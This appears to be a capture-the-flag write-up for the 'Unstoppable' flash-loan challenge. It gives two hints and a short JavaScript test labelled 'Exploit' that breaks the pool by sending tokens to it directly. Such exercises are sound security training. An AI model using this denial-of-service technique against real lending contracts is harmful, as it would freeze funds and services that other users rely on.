# 1 - Unstoppable

### Hints

<details>

<summary>Hint One</summary>

There are more ways to break a flash loan than draining the contract’s token balance.

</details>

<details>

<summary>Hint Two</summary>

Simply asserting something doesn’t make it true.

</details>

### Scripted Solution

```javascript
it('Exploit', async function () {
  // Send tokens to pool contract address via token contract's `transfer`
  await this.token
    .connect(attacker)
    .transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
})
```
